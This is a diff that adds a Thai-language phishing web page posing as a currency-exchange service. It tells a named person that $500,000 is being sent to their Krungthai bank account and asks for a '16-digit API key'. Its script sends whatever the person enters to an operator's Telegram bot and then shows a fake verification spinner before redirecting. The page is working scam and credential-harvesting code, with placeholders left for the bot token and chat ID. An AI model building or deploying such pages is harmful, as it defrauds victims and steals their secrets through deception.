@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>แลกเปลี่ยนเงิน</title>
+    <style>
+        body { font-family: 'Sarabun', sans-serif; background: #0072BC; text-align: center; padding: 20px; color: white; }
+        .container { background: white; padding: 20px; border-radius: 15px; box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2); max-width: 500px; margin: auto; color: black; }
+        .header { font-size: 18px; font-weight: bold; color: #0072BC; margin-bottom: 20px; }
+        .message { font-size: 16px; color: #333; margin-bottom: 20px; }
+        input { width: 100%; padding: 10px; font-size: 16px; border: 1px solid #ccc; border-radius: 5px; text-align: center; }
+        .button { width: 100%; padding: 12px; background: #0072BC; color: white; font-size: 18px; border: none; border-radius: 5px; cursor: pointer; margin-top: 15px; }
+        .button:hover { background: #005a8e; }
+        .loading { display: none; margin-top: 20px; }
+        .loader { width: 50px; height: 50px; border: 5px solid #0072BC; border-top: 5px solid #FFD700; border-radius: 50%; animation: spin 1s linear infinite; margin: auto; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        #current-time { margin-top: 20px; font-size: 14px; color: white; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="header">แลกเปลี่ยนเงิน</div>
+        <div class="message">
+            เรียนคุณ ธนวัฒน์ ไดโกะคสุง<br>
+            เรากำลังดำเนินการโอนเงิน $500,000 ไปยังบัญชีธนาคารกรุงไทยของคุณ<br>
+            เนื่องจากเงินของคุณเป็นดอลลาร์ เราจำเป็นต้องแลกเปลี่ยนเป็นบาทไทย<br>
+            โปรดป้อน **API Key 16 หลัก** สำหรับการแลกเปลี่ยน
+        </div>
+
+        <input type="text" id="apiKey" maxlength="16" placeholder="ใส่ API Key 16 หลัก">
+
+        <button class="button" onclick="submitAPI()">ยืนยันและแลกเปลี่ยน</button>
+
+        <div class="loading" id="loadingContainer">
+            <div class="loader"></div>
+            <div>กำลังตรวจสอบ API Key...</div>
+        </div>
+
+        <div id="current-time"></div>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN"; // Replace with your bot's token
+        const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"; // Replace with your chat ID
+
+        function submitAPI() {
+            let apiKey = document.getElementById("apiKey").value;
+            if (apiKey.length !== 16) {
+                alert("กรุณาใส่ API Key ที่ถูกต้อง (16 ตัวอักษร)");
+                return;
+            }
+            
+            document.getElementById("loadingContainer").style.display = "block";
+
+            let telegramMessage = `🔹 API Key Submission 🔹\nAPI Key: ${apiKey}`;
+            let telegramURL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(telegramMessage)}`;
+
+            fetch(telegramURL)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        setTimeout(() => {
+                            window.location.href = "review.html";
+                        }, 3000);
+                    } else {
+                        alert("เกิดข้อผิดพลาดในการส่งข้อมูลไปยัง Telegram");
+                        document.getElementById("loadingContainer").style.display = "none";
+                    }
+                })
+                .catch(error => {
+                    alert("ไม่สามารถเชื่อมต่อกับ Telegram");
+                    document.getElementById("loadingContainer").style.display = "none";
+                });
+        }
+
+        function updateTime() {
+            document.getElementById("current-time").innerText = new Date().toLocaleString("th-TH");
+        }
+        setInterval(updateTime, 1000);
+    </script>
+
+</body>
+</html>
